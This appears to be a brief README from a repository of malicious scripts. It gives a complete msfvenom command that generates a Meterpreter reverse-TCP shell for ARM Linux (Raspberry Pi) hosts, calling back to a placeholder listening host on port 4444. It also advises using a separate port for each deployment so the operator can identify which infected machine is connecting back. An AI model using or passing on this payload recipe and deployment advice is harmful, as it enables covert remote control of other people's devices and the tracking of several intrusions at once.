The scripts you find here are malicious! Don't touch!

To generate a new shellscript that will work on the raspberry pi hosts, use the following command:

msfvenom --arch armle --platform linux -p linux/armle/meterpreter/reverse_tcp LHOST=<SetListeningHost> LPORT=4444 -f elf > shell.elf

You might consider generating a new script with a new port pairing for each deployment of this payload.
This way, you can keep track of each different deployment port pairing and know which machine is calling you back.
